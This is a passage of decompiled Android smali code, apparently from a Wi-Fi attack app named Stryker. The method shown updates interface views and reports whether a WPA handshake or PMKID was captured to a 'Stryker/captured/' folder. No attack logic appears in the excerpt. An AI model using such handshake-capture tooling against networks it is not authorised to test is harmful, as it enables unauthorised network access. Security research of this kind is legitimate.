    iget-object v5, p0, Lh9/m;->i:Landroid/widget/TextView;

    iget-object v6, p0, Lh9/m;->r:Ljava/util/Timer;

    new-instance v8, Li8/f;

    const/4 v7, 0x6

    move-object v1, v8

    move-object v2, p0

    invoke-direct/range {v1 .. v7}, Li8/f;-><init>(Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Landroid/widget/TextView;Ljava/lang/Object;I)V

    invoke-virtual {v0, v8}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method public final d()V
    .locals 4

    sget-object v0, Lf9/g;->d:Lf9/m;

    const/high16 v1, 0x3f800000    # 1.0f

    invoke-static {v1}, Ljava/lang/Float;->valueOf(F)Ljava/lang/Float;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    iget-object v0, p0, Lh9/m;->e:Landroid/widget/ImageView;

    invoke-static {v0, v1}, Lf9/m;->b0(Landroid/view/View;Ljava/lang/Float;)V

    sget-object v0, Lf9/g;->d:Lf9/m;

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Float;->valueOf(F)Ljava/lang/Float;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    iget-object v0, p0, Lh9/m;->f:Landroid/widget/ProgressBar;

    invoke-static {v0, v1}, Lf9/m;->b0(Landroid/view/View;Ljava/lang/Float;)V

    iget-object v0, p0, Lh9/m;->g:Landroid/widget/TextView;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/view/View;->setVisibility(I)V

    iget-object v2, p0, Lh9/m;->h:Lcom/google/android/material/card/MaterialCardView;

    const/16 v3, 0x8

    invoke-virtual {v2, v3}, Landroid/view/View;->setVisibility(I)V

    iget-object v2, p0, Lh9/m;->i:Landroid/widget/TextView;

    const-string v3, "OK"

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v2, p0, Lh9/m;->j:[Z

    aget-boolean v2, v2, v1

    if-eqz v2, :cond_0

    const-string v1, "Handshake captured!\n Check Stryker/captured/ folder"

    goto :goto_0

    :cond_0
    iget-object v2, p0, Lh9/m;->k:[Z

    aget-boolean v1, v2, v1

    if-eqz v1, :cond_1

    const-string v1, "PMKID captured!\n Check Stryker/captured/ folder"

    goto :goto_0

    :cond_1
    const-string v1, "Handshake not captured"

    :goto_0
    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    return-void
.end method
